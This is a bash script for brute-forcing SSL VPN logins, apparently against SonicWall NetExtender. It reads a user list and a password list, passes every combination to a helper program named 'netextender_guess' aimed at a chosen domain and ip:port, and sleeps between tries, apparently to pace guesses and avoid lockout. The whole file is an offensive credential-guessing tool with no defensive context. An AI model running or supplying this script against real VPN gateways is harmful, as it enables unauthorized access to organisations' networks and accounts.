#!/bin/bash

#./script users passwords domain ip:port
userlist=$1
passwordlist=$2
domain=$3
sslvpn=$4

#try $attempts times and then sleep for $sleep seconds
sleep=5
attempts=1

#colours, yo
RED='\033[0;31m'
GREEN='\e[32m'
NC='\033[0m'

i=1
cat $userlist | while read user; do
	cat $passwordlist | while read password; do
		echo -e "${GREEN}Trying $user::$password${NC}"
		./netextender_guess $user $password $domain $sslvpn


		if [ $(expr $i % $attempts) -eq 0 ]; then
			echo "sleeping $sleep"
			sleep $sleep
		fi
		i=$(expr $i + 1)
	done
done
